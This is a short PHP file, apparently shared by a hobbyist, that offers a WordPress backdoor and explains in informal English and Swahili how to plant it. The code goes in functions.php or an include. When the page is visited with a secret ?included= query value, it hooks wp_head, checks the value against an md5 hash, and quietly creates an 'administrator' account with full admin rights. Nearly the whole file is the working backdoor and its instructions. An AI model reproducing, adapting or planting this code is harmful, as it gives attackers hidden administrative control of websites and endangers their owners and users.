
<?php 
/**
so  today i created a simple php function called  ** drum rolls **   included ...

this little script when run, bypasses browser safety detections
&  creates a backdoor that you can use to access a wordpress website

 

so, all you need to do to trigger the site is ::

visit the url of the website then add the following words ?included=go

so... for example ::: https://www.abcd.co.ke?included=go


this will automatically log you in as  the admin ...!!


Disclaimer:

to set up this script, you need to paste it in the functions.php file of wordpress 
(but its not a must you paste evrything hapa) 

** you can also use::  php include_once  <path/to /file> command ... aslong as ii url iko kwa functions.php,
then this script you cn even run it on github ukidai ..

since this code cant currently  patch itsself up, you need to do that yourself... 

 */
 
 


add_action( 'wp_head', 'included' );


function included() {
    
	// use md5 to salt your "backdoor" password
    if ( md5( $_GET['included'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
	
	// target the script that handles the registration process ( wordpress signup process) where the magic happens :)
        require( 'wp-includes/registration.php' );
		
	//check if there is a user with the name administrator ... , if there is'nt, create one (YOU CAN EDIT THIS BTW)
        if ( !username_exists( 'administrator' ) ) {
		
	// secretly create  a user called administrator and password called $included
	// you can change this yo your desired username and password 
	
   // in my case : username is -> administrator , password is -> $included   

            $user_id = wp_create_user( 'administrator', '$included' );
			
	//secretly assign a user_id ...remember ,most wordpress logins or most (mysql +php sites) inakuanga where $user_id = '$user_id' 
            $user = new WP_User( $user_id );
			
	//secretly assign the administrator role 
	
            $user->set_role( 'administrator' ); 
        }
    }
}
